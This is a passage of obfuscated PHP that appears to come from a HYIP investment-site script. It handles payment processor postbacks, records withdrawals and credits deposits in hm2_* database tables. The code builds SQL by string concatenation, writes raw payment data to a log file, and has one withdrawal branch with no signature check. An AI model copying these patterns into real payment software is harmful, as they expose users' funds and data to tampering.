  }

  $elnlcroEyb = elnlcpukl ($elnlcebOCn['elnlcTyoWo']);
  $elnlcTGErn = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcPqbc'])
  {
    $elnlcroEyb[$elnlcebOCn['elnlcqjGB']] = $elnlcebOCn['elnlcrjLb'];
  }

  if ($elnlcroEyb[$elnlcebOCn['elnlcqjGB']] == $elnlcebOCn['elnlcNqcl'])
  {
    $elnlcvufT = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $elnlcroEyb[$elnlcebOCn['elnlcDOlB']] = '&#8364;';
    $elnlcroEyb[$elnlcebOCn['elnlcBcUy']] = $elnlcebOCn['elnlcQHqgg'];
    $elnlcroEyb[$elnlcebOCn['elnlcpFCxr']] = $elnlcebOCn['elnlcIbkD'];
    $elnlcroEyb[$elnlcebOCn['elnlckSns']] = $elnlcebOCn['elnlcnekSc'];
  }
  else
  {
    if (($elnlcroEyb[$elnlcebOCn['elnlcqjGB']] == $elnlcebOCn['elnlcUCSnz'] AND $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcDlxkl']))
    {
      $elnlcvufT = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
      $elnlcroEyb[$elnlcebOCn['elnlcDOlB']] = $elnlcebOCn['elnlcbcrTw'];
      $elnlcroEyb[$elnlcebOCn['elnlcBcUy']] = $elnlcebOCn['elnlcQoIm'];
    }
    else
    {
      $elnlcvufT = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $elnlcroEyb[$elnlcebOCn['elnlcDOlB']] = '$';
      $elnlcroEyb[$elnlcebOCn['elnlcBcUy']] = $elnlcebOCn['elnlciREG'];
      $elnlcroEyb[$elnlcebOCn['elnlcpFCxr']] = $elnlcebOCn['elnlcbzNn'];
      $elnlcroEyb[$elnlcebOCn['elnlckSns']] = $elnlcebOCn['elnlcyqBaG'];
    }
  }

  $elnlcroEyb[$elnlcebOCn['elnlccBAeG']] = $elnlcebOCn['elnlciREG'];
  if ((($elnlcroEyb[$elnlcebOCn['elnlcNHoeL']] AND !$elnlcroEyb[$elnlcebOCn['elnlcQypDv']]) AND !$elnlcroEyb[$elnlcebOCn['elnlcBToFC']]))
  {
    $elnlcroEyb[$elnlcebOCn['elnlcBToFC']] = $elnlcebOCn['elnlciREG'];
  }

  if ($elnlcroEyb[$elnlcebOCn['elnlcQypDv']])
  {
    $elnlcroEyb[$elnlcebOCn['elnlcTluzS']] = $elnlcroEyb[$elnlcebOCn['elnlcNHoeL']];
  }
  else
  {
    $elnlcroEyb[$elnlcebOCn['elnlcTluzS']] = '';
  }

  if ($elnlcroEyb[$elnlcebOCn['elnlcBToFC']])
  {
    $elnlcroEyb[$elnlcebOCn['elnlcHwwIc']] = $elnlcroEyb[$elnlcebOCn['elnlcNHoeL']];
  }
  else
  {
    $elnlcroEyb[$elnlcebOCn['elnlcHwwIc']] = '';
  }

  foreach ($elnlcvufT as $elnlcuIrtW => $elnlcIDxg)
  {
    if (($elnlcroEyb['def_payee_account_' . $elnlcIDxg['sfx']] != '' AND $elnlcroEyb['def_payee_account_' . $elnlcIDxg['sfx']] != '0'))
    {
      $elnlcvufT[$elnlcuIrtW][$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlciREG'];
      continue;
    }
    else
    {
      $elnlcvufT[$elnlcuIrtW][$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcMkRzz'];
      continue;
    }
  }

  if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcnuRp'])
  {
    $elnlcidIU = array (1 => 'english', 2 => 'estonians', 3 => $elnlcebOCn['elnlcjvGl']);
  }

  if (($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] != 'RHLFPPEURGQGG68GXYA8' AND $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $elnlcroEyb[$elnlcebOCn['elnlcAyhJB']] = $elnlcebOCn['elnlcMkRzz'];
  }

  if (($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcUyTBT'] OR $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcweWx']))
  {
    $elnlcroEyb[$elnlcebOCn['elnlcAPEV']] = $elnlcebOCn['elnlciREG'];
  }

  if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcxtqcg'])
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcJkvnc'] OR $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcIupzV']) OR $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcFvhx']) OR $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcjLyRA']) OR $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcRzKpE']) OR $elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcWJiD']))
  {
    if ($elnlctogMz[$elnlcebOCn['elnlchied']] != '')
    {
      $elnlctogMz[$elnlcebOCn['elnlcjbSmx']] = $elnlctogMz[$elnlcebOCn['elnlchied']];
      $_SERVER[$elnlcebOCn['elnlcjbSmx']] = $elnlctogMz[$elnlcebOCn['elnlchied']];
    }
  }

  $elnlcBgTLB = elnlcsoirh ();
  if (!$elnlcBgTLB)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  if (file_exists ('./tmpl_c/log_postbacks'))
  {
    $elnlcylsVl = fopen ($elnlcebOCn['elnlcrWNbH'], $elnlcebOCn['elnlczcROd']);
    foreach ($elnlcQAFiW as $k => $v)
    {
      fwrite ($elnlcylsVl, ('' . $k . ' => ' . $v . '
'));
    }

    foreach ($elnlctogMz as $k => $v)
    {
      fwrite ($elnlcylsVl, ('' . $k . ' => ' . $v . '
'));
    }

    fwrite ($elnlcylsVl, '--------------------------------
');
    fclose ($elnlcylsVl);
  }

  $elnlcmWuU = $elnlcroEyb[$elnlcebOCn['elnlcGTTKr']];
  if ($elnlcQAFiW[$elnlcebOCn['elnlcTujMN']] == $elnlcebOCn['elnlcrSWk'])
  {
    $elnlcTTklA = 'n/a';
    list ($elnlcuIrtW, $elnlcQBRqn) = explode ('-', $elnlcQAFiW[$elnlcebOCn['elnlcUPbR']]);
    $elnlcuIrtW = sprintf ('%d', $elnlcuIrtW);
    if ($elnlcQBRqn == '')
    {
      $elnlcQBRqn = $elnlcebOCn['elnlcUiUc'];
    }

    $elnlcQBRqn = elnlcxfvdc ($elnlcQBRqn);
    $q = '' . 'select * from hm2_history where id = ' . $elnlcuIrtW . ' and str = \'' . $elnlcQBRqn . '\' and type=\'withdraw_pending\'';
    $elnlcaJzM = mysql_query ($q);
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlcuIrtW;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
	amount = -' . abs ($elnlcMuwB[$elnlcebOCn['elnlcBfAt']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcTTklA . '\',
	actual_amount = -') . abs ($elnlcMuwB[$elnlcebOCn['elnlcBfAt']]) . ',
	ec = 23,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']];
      $elnlcaJzM = mysql_query ($q);
      $elnlckaefz = mysql_fetch_array ($elnlcaJzM);
      $elnlcKCwJ = array ();
      $elnlcKCwJ[$elnlcebOCn['elnlcAsniz']] = $elnlckaefz[$elnlcebOCn['elnlcAsniz']];
      $elnlcKCwJ[$elnlcebOCn['elnlcfCuqi']] = $elnlckaefz[$elnlcebOCn['elnlcfCuqi']];
      $elnlcKCwJ[$elnlcebOCn['elnlcBfAt']] = sprintf ('%.02f', abs ($elnlcMuwB[$elnlcebOCn['elnlcBfAt']]));
      $elnlcKCwJ[$elnlcebOCn['elnlchDAbD']] = 'n/a';
      $elnlcKCwJ[$elnlcebOCn['elnlcjpTJ']] = $elnlcTTklA;
      $elnlcKCwJ[$elnlcebOCn['elnlcQIzqa']] = $elnlcTTklA;
      $elnlcKCwJ[$elnlcebOCn['elnlcwfhIv']] = $elnlcTTklA;
      $elnlcKCwJ[$elnlcebOCn['elnlcjbPh']] = $elnlcvufT[23][$elnlcebOCn['elnlcfCuqi']];
      elnlcfdrqh ('withdraw_user_notification', $elnlckaefz['email'], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcKCwJ);
    }

    print 1;
    elnlcbprci ($elnlcBgTLB);
    exit ();
  }

  $elnlcwafyy = md5 ($elnlcQAFiW[$elnlcebOCn['elnlcqpNV']] . ':' . $elnlcQAFiW[$elnlcebOCn['elnlcRrqjU']] . ':' . $elnlcQAFiW[$elnlcebOCn['elnlcxpQN']] . ':' . $elnlcQAFiW[$elnlcebOCn['elnlcuLSG']] . ':' . $elnlcQAFiW[$elnlcebOCn['elnlcuFhQd']] . ':' . $elnlcQAFiW[$elnlcebOCn['elnlcxdIhI']] . ':' . $elnlcQAFiW[$elnlcebOCn['elnlcKovwO']] . ':' . $elnlcmWuU);
  if (((strtolower ($elnlcwafyy) == strtolower ($elnlcQAFiW[$elnlcebOCn['elnlcSMzSo']]) AND $elnlcQAFiW[$elnlcebOCn['elnlcuFhQd']] === 'USD') AND $elnlcvufT[23][$elnlcebOCn['elnlccIMd']] == 1))
  {
    $elnlcVxTxK = elnlcrbvll ($elnlcQAFiW[$elnlcebOCn['elnlcLpifL']], 1);
    $elnlcQAFiW = array_merge ($elnlcQAFiW, $elnlcVxTxK);
    $elnlcqQfG = sprintf ('%d', $elnlcQAFiW[$elnlcebOCn['elnlcwnri']]);
    $elnlcygfPy = sprintf ('%d', $elnlcQAFiW[$elnlcebOCn['elnlcoACzF']]);
    $elnlcvvfv = sprintf ('%0.2f', $elnlcQAFiW[$elnlcebOCn['elnlcEJfms']]);
    $elnlcdrkS = $elnlcQAFiW[$elnlcebOCn['elnlcuLSG']];
    $elnlcTTklA = $elnlcQAFiW[$elnlcebOCn['elnlcxdIhI']];
    $elnlcgobCh = $elnlcQAFiW[$elnlcebOCn['elnlcRrqjU']];
    if ($elnlcQAFiW[$elnlcebOCn['elnlcvdSIu']] == $elnlcebOCn['elnlcMPDi'])
    {
      elnlczfwh (23, $elnlcqQfG, $elnlcdrkS, $elnlcTTklA, $elnlcgobCh, $elnlcygfPy, $elnlcvvfv);
    }
  }

  elnlcbprci ($elnlcBgTLB);
  print '1';
  exit ();
?>